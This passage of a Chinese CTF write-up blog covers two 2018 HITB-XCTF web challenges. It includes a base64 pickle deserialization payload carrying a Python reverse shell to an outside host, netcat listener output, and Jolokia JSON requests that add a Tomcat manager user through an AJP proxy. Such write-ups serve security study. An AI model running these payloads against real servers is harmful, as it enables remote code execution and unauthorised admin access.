+<p>运行得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6c9bb5a6c403532334724160875f921baef27b8e8be27d0a3db3d49dd84d8ee4!Y3BsYXRmb3JtCnBvcGVuCnAwCihTJ3B5dGhvbiAtYyBcJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxMjcuMC4wLjEiLDIzMzMzKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTtcJycKcDEKdHAyClJwMwou</span><br></pre></td></tr></table></figure></p>
+<p>接着在你的vps上打开端口监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 23333</span><br></pre></td></tr></table></figure></p>
+<p>然后更改cookie中的location为此值，刷新页面得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;open file &apos;python -c \&apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;138.68.225.135&quot;,23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\&apos;&apos;, mode &apos;r&apos; at 0x7fdb5f9e1c00&gt;</span><br></pre></td></tr></table></figure></p>
+<p>查看vps端口监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Listening on [0.0.0.0] (family 0, port 23333)</span><br><span class="line">Connection from [47.75.151.118] port 23333 [tcp/*] accepted (family 2, sport 52880)</span><br><span class="line">/bin/sh: 0: can&apos;t access tty; job control turned off</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
+<p>发现收到shell<br>执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">app.py</span><br><span class="line">app.pyc</span><br><span class="line">run.py</span><br><span class="line">run.pyc</span><br><span class="line">static</span><br><span class="line">templates</span><br></pre></td></tr></table></figure></p>
+<p>发现成功<br>于是探寻flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ cd ..</span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">easy_sandbox</span><br><span class="line">etc</span><br><span class="line">flag_is_here</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">$ cat flag_is_here</span><br><span class="line">HITB&#123;Py5h0n1st8eBe3tNOW&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最后成功拿到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HITB&#123;Py5h0n1st8eBe3tNOW&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Baby-Nya"><a href="#Baby-Nya" class="headerlink" title="Baby Nya"></a>Baby Nya</h2><p>看到提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the tomcat deployed jolokia.war</span><br></pre></td></tr></table></figure></p>
+<p>扫描端口，看见<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8009</span><br></pre></td></tr></table></figure></p>
+<p>端口开放<br>根据文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/</span><br></pre></td></tr></table></figure></p>
+<p>进行如下操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Step 1: Install the Dependencies</span><br><span class="line">The first line installs the mod-jk package which allows Apache to forward requests to Tomcat using the AJP protocol. It can communication to Tomcat on the local machine or to a remote instance. The second line enables the proxy_ajp module and required dependencies automatically.</span><br></pre></td></tr></table></figure></p>
+<p>指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install libapache2-mod-jk</span><br><span class="line">a2enmod proxy_ajp</span><br></pre></td></tr></table></figure></p>
+<p>然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Step 2: Configure Apache</span><br><span class="line">Next create a configuration file in /etc/apache2/sites-enabled/ which will hold our proxy setup, I’ve named mine ajp.conf.</span><br></pre></td></tr></table></figure></p>
+<p>文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ProxyRequests Off</span><br><span class="line"># Only allow localhost to proxy requests</span><br><span class="line">&lt;Proxy *&gt;</span><br><span class="line">Order deny,allow</span><br><span class="line">Deny from all</span><br><span class="line">Allow from localhost</span><br><span class="line">&lt;/Proxy&gt;</span><br><span class="line"># Change the IP address in the below lines to the remote servers IP address hosting the Tomcat instance</span><br><span class="line">ProxyPass                 / ajp://192.168.109.134:8009/</span><br><span class="line">ProxyPassReverse    / ajp://192.168.109.134:8009/</span><br></pre></td></tr></table></figure></p>
+<p>然后重启apache2，接着指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start apache2</span><br></pre></td></tr></table></figure></p>
+<p>即可在本地访问到题目的8009端口<br>后来看到这样一篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ricterz.me/posts/Exploiting%20Jolokia%20Agent%20with%20Java%20EE%20Servers</span><br></pre></td></tr></table></figure></p>
+<p>发现可以添加管理员用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 创建 manager-gui</span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">    &quot;mbean&quot;: &quot;Users:database=UserDatabase,type=UserDatabase&quot;,</span><br><span class="line">    &quot;operation&quot;: &quot;createRole&quot;,</span><br><span class="line">    &quot;arguments&quot;: [&quot;manager-gui&quot;, &quot;&quot;]</span><br><span class="line">&#125;</span><br><span class="line">// 创建用户</span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">    &quot;mbean&quot;: &quot;Users:database=UserDatabase,type=UserDatabase&quot;,</span><br><span class="line">    &quot;operation&quot;: &quot;createUser&quot;,</span><br><span class="line">    &quot;arguments&quot;: [&quot;test233&quot;, &quot;test233&quot;, &quot;&quot;]</span><br><span class="line">&#125;</span><br><span class="line">// 增加角色</span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;EXEC&quot;,</span><br><span class="line">    &quot;mbean&quot;: &quot;Users:database=UserDatabase,type=User,username=\&quot;test233\&quot;&quot;,</span><br><span class="line">    &quot;operation&quot;: &quot;addRole&quot;,</span><br><span class="line">    &quot;arguments&quot;: [&quot;manager-gui&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>接着利用 test233 / test233 登陆即可<br>最后直接在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/manager/html</span><br></pre></td></tr></table></figure></p>
+<p>看到flag</p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+            <li class="next">
+                <a href= "/2018/04/15/Long-Ago-AWD-Flasky/" title= Long-Ago-AWD-Flasky >
+                    <span>Next Post</span>
+                    <span>Long-Ago-AWD-Flasky</span>
+                </a>
+            </li>
+        
+        
+            <li class="previous">
+                <a href= "/2018/04/11/0ctf-ezdoor/" title= 0ctf-ezdoor >
+                    <span>Previous Post</span>
+                    <span>0ctf-ezdoor</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:136244588@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/skyofkinglove" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv" style="color:black;font-size:14px">VISITOR VOLUME: <span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#upload"><span class="toc-number">1.</span> <span class="toc-text">upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-baby"><span class="toc-number">2.</span> <span class="toc-text">Baby baby</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python’s-revenge"><span class="toc-number">3.</span> <span class="toc-text">Python’s revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-Nya"><span class="toc-number">4.</span> <span class="toc-text">Baby Nya</span></a></li></ol>
+    </div>
+    
+    <div class="back-top">&#xe639;</div>
+    <div class="sidebar">
+    <div class="sidebar-header sidebar-header-show-archive">
+        <div class="sidebar-category">
+            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>Archive</span>
+            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>Tag</span>
+        </div>
+    </div>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-archive">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 109 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2018/05/31/2018.5.18信息安全铁人三项赛数据赛题解/" >2018.5.18信息安全铁人三项赛数据赛题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" >2017-2018赛季信息安全铁人三项赛全国第三赛区数据赛题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2018/05/27/2018RedHat-AD-Web/" >2018RedHat-AD-Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/19</span><a class="archive-post-title" href= "/2018/05/19/Json-Web-Token历险记/" >Json Web Token历险记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/19</span><a class="archive-post-title" href= "/2018/05/19/2018CUMTCTF-Final-Web/" >2018CUMTCTF-Final-Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href= "/2018/05/12/2018年第四届全国网络空间安全技术大赛/" >2018年第四届全国网络空间安全技术大赛</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/01</span><a class="archive-post-title" href= "/2018/05/01/2018-RedHat-Web-Misc/" >2018-RedHat-Web_Misc</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href= "/2018/04/27/线下AD-代码审计-ECShop-V2-7-3/" >线下AD&代码审计&ECShop V2.7.3</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2018/04/22/DDCTF-bitcoin-51per-Attack/" >DDCTF-bitcoin-51%Attack</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/流量分析-CTF题目实战/" >流量分析-CTF题目实战</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2018/04/21/数据分析-企业渗透过程/" >数据分析-企业渗透过程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/16</span><a class="archive-post-title" href= "/2018/04/16/2018-XCTF-HITB-PhpLover/" >2018-XCTF-HITB-PhpLover</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/15</span><a class="archive-post-title" href= "/2018/04/15/Long-Ago-AWD-Flasky/" >Long-Ago-AWD-Flasky</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/13</span><a class="archive-post-title" href= "/2018/04/13/2018-XCTF-HITB-WEB/" >2018-XCTF-HITB-WEB</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2018/04/11/0ctf-ezdoor/" >0ctf-ezdoor</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/pwnhub-time-injection带来的新思路/" >pwnhub time injection带来的新思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2018/04/04/amazing-phpinfo/" >amazing phpinfo()</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2018/04/01/Python-is-the-best-language/" >Python is the best language</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2018/03/23/从sql注入到xslt再到xxe的一道ctf题目/" >从sql注入到xslt再到xxe的一道ctf题目</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href= "/2018/03/21/从一道题深入mysql字符集与比对方法collation/" >从一道题深入mysql字符集与比对方法collation</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/solveme-peng-kr-web/" >solveme.peng.kr-web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/Some trick in ssrf and unserialize()/" >Some trick in ssrf and unserialize()</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2018/03/12/N1CTF-2018-Web/" >N1CTF 2018-Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/09</span><a class="archive-post-title" href= "/2018/03/09/php-command or code-injection-summary/" >php-command/code-injection summary</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href= "/2018/03/05/2018安全客元宵节小礼品趣味题/" >2018安全客元宵节小礼品趣味题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2018/02/27/2018安恒杯2月月赛web题解/" >2018安恒杯2月月赛web题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span><a class="archive-post-title" href= "/2018/02/25/hgame-week4-web/" >hgame-week4-web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
